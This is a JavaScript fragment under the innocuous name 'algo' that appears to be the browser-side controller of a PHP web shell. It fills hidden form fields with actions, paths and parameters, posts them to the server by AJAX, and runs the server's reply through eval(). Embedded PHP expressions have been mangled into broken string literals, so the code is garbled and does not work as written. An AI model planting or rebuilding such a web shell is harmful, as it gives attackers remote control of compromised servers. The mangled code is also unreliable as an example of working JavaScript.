function algo() {
    var c_ = '" . htmlspecialchars($GLOBALS[' + cwd + ']) . "';
    var a_ = '" . htmlspecialchars(@$_POST[' + a + ']) . "';
    var charset_ = '" . htmlspecialchars(@$_POST[' + charset + ']) . "';
    var p1_ = '" . ((strpos(@$_POST[' + p1 + '], "\n") !== false) ? ' +
            ' : htmlspecialchars($_POST[' + p1 + '], ENT_QUOTES)) . "';
    var p2_ = '" . ((strpos(@$_POST[' + p2 + '], "\n") !== false) ? ' +
            ' : htmlspecialchars($_POST[' + p2 + '], ENT_QUOTES)) . "';
    var p3_ = '" . ((strpos(@$_POST[' + p3 + '], "\n") !== false) ? ' +
            ' : htmlspecialchars($_POST[' + p3 + '], ENT_QUOTES)) . "';
    var d = document;
    function set(a, c, p1, p2, p3, charset) {
        if (a != null)
            d.mf.a.value = a;
        else
            d.mf.a.value = a_;
        if (c != null)
            d.mf.c.value = c;
        else
            d.mf.c.value = c_;
        if (p1 != null)
            d.mf.p1.value = p1;
        else
            d.mf.p1.value = p1_;
        if (p2 != null)
            d.mf.p2.value = p2;
        else
            d.mf.p2.value = p2_;
        if (p3 != null)
            d.mf.p3.value = p3;
        else
            d.mf.p3.value = p3_;
        if (charset != null)
            d.mf.charset.value = charset;
        else
            d.mf.charset.value = charset_;
    }
    function g(a, c, p1, p2, p3, charset) {
        set(a, c, p1, p2, p3, charset);
        d.mf.submit();
    }
    function a(a, c, p1, p2, p3, charset) {
        set(a, c, p1, p2, p3, charset);
        var params = 'ajax=true';
        for (i = 0; i < d.mf.elements.length; i++) {
            params += '&' + d.mf.elements[i].name + '=' + encodeURIComponent(d.mf.elements[i].value);
        }
        sr('" . addslashes($_SERVER[' + REQUEST_URI + ']) . "', params);
    }
    function sr(url, params) {
        if (window.XMLHttpRequest)
            req = new XMLHttpRequest();
        else if (window.ActiveXObject)
            req = new ActiveXObject('Microsoft.XMLHTTP');
        if (req) {
            req.onreadystatechange = processReqChange;
            req.open('POST', url, true);
            req.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
            req.send(params);
        }
    }
    function processReqChange() {
        if ((req.readyState == 4))
            if (req.status == 200) {
                var reg = new RegExp("(\\\\d+)([\\\\S\\\\s]*)", 'm');
                var arr = reg.exec(req.responseText);
                eval(arr[2].substr(0, arr[1]));
            } else {
                alert('Request error!');
            }
    }
}